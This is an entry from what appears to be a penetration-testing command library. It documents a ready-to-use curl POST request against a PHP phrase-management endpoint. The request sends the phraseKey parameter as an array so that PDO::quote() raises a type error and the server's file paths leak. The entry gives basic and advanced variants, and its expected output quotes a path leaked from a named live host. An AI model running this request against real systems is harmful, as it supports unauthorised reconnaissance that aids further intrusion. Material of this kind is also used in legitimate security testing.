---
data: >-
  curl -X POST 'http://target.com/path/to/endpoint.php' -d
  'action=phraseChange&phraseChange[phraseKey][11]=test' --verbose
tags:
  - web-exploit
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '[TIMESTAMP]'
updated_at: '2025-12-14T17:26:06.166Z'
id: 00d4fc83-dfd4-4e2d-a624-120dc9da211a
verified: false
validated: true
submitted: true
---
# curl-submit-malformed-phrasekey

## Command

```bash
curl -X POST 'http://target.com/path/to/endpoint.php' \
  -d 'action=phraseChange&phraseChange[phraseKey][11]=test' \
  --verbose
```

## Description

This command uses curl to submit a POST request to a vulnerable PHP endpoint, crafting the phrasekey parameter as an array to trigger a PDO::quote() type error and disclose server paths. Replace 'http://target.com/path/to/endpoint.php' with the actual URL handling phraseChange or phrasemove actions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'http://target.com/path/to/endpoint.php'` | Target endpoint URL | Yes |
| `-d 'action=phraseChange&phraseChange[phraseKey][11]=test'` | Form data with malformed array parameter; adjust action to phrasemove if needed | Yes |
| `--verbose` | Enables detailed output including response body for error inspection | No |

## Examples

### Basic Usage

```bash
curl -X POST 'http://target.com/admin/phrase.php' -d 'action=phraseChange&phraseChange[phraseKey][11]=test'
```

### Advanced Usage

```bash
curl -X POST 'http://target.com/admin/phrase.php' \
  -d 'action=phraseChange&phraseChange[phraseKey][11]=test&other_param=value' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --verbose --output response.html
```

## Expected Output

A 500 Internal Server Error response body containing PHP warnings (e.g., "PDO::quote() expects parameter 1 to be string, array given in /path/to/Database.php on line 30") and a PDOException stack trace with SQL syntax errors, leaking full server paths like "/srv/data/web/vhosts/www.localize.im/htdocs/classes/Database.php".

## Related

- [[Related Procedure|procedures/Trigger-PDO-Quote-Error-for-Path-Disclosure]]
